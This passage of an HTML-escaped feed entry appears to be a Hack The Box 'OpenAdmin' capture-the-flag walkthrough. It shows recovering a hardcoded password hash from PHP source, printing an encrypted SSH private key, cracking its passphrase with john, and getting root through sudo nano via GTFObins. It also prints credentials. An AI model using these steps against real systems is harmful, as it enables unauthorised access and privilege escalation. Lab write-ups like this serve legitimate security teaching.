+&lt;p&gt;&lt;img src=&quot;/assets/htb/OpenAdmin/webpage-internal.png&quot; alt=&quot;Internal webpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The login is password-protected and the found credentials (jimmy:n1nj4W4rri0R!) do not work…
+With a shell on the server, let’s check if we can access the source of this website.&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;jimmy@openadmin:/var/www$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-alh&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 16K
+drwxr-xr-x  4 root     root     4.0K Nov 22 18:15 .
+drwxr-xr-x 14 root     root     4.0K Nov 21 14:08 ..
+drwxr-xr-x  6 www-data www-data 4.0K Nov 22 15:59 html
+drwxrwx---  2 jimmy    internal 4.0K Nov 23 17:43 internal
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;lrwxrwxrwx  1 www-data www-data   12 Nov 21 16:07 ona -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/opt/ona/www
+&lt;span class=&quot;gp&quot;&gt;jimmy@openadmin:/var/www$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;internal
+&lt;span class=&quot;gp&quot;&gt;jimmy@openadmin:/var/www/internal$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;index.php  logout.php  main.php
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Seems like we can indeed access the source code to internal…
+Checking out index.php:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Enter Username and Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class = &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container form-signin&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;featurette-heading&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login Restricted.&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text-muted&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'jimmy'&lt;/span&gt;
+              &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sha512'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                  &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'jimmy'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                  &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: /main.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                  &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Wrong username or password.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+              &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+         &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Seems like the password is hardcoded! Let’s use google and check if this hash is known…&lt;/p&gt;
+
+&lt;p&gt;The password is “Revealed”. It can be found &lt;a href=&quot;https://md5hashing.net/hash/sha512/00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Using the creds (jimmy:Revealed) we can login successfully.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/OpenAdmin/webpage-internal-main.png&quot; alt=&quot;Internal main webpage&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;cracking-ssh-private-key&quot;&gt;Cracking SSH private key&lt;/h3&gt;
+&lt;p&gt;The RSA private key seems interesting, so we’ll save it to a file:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@silence:~# cat joanna.key
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using john we can extract and crack the hash of the rsa private-key:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh2john joanna.key &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; joanna-key.hash
+&lt;span class=&quot;gp&quot;&gt;root@silence:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;john joanna-key.hash &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
+&lt;span class=&quot;go&quot;&gt;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+bloodninjas      (joanna.key)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;With the password for the SSH-key cracked we can finally login via SSH and hopefully get user.txt:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;ssh -i joanna.key joanna@10.10.10.171
+Enter passphrase for key 'joanna.key': bloodninjas
+Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;joanna@openadmin:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+&lt;span class=&quot;go&quot;&gt;c9b2c***************************
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc-to-root&quot;&gt;Privesc to root&lt;/h2&gt;
+&lt;p&gt;Checking the sudo privileges of joanna we have our privilege escalation path:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;joanna@openadmin:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Matching Defaults entries for joanna on openadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Checking out &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nano/#shell&quot;&gt;GTFObins&lt;/a&gt;, we have a quick way to get a shell as root.
+&lt;img src=&quot;/assets/htb/OpenAdmin/gtfobin-nano.png&quot; alt=&quot;GTFObin nano&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;joanna@openadmin:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nano /opt/priv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/OpenAdmin/privesc-nano1.png&quot; alt=&quot;Privesc part 1&quot; /&gt;
+&lt;img src=&quot;/assets/htb/OpenAdmin/privesc-nano2.png&quot; alt=&quot;Privesc part 2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can read root.txt:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
+&lt;span class=&quot;go&quot;&gt;2f907***************************
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Chr0x6eOs</name></author><summary type="html">Overview</summary></entry></feed>
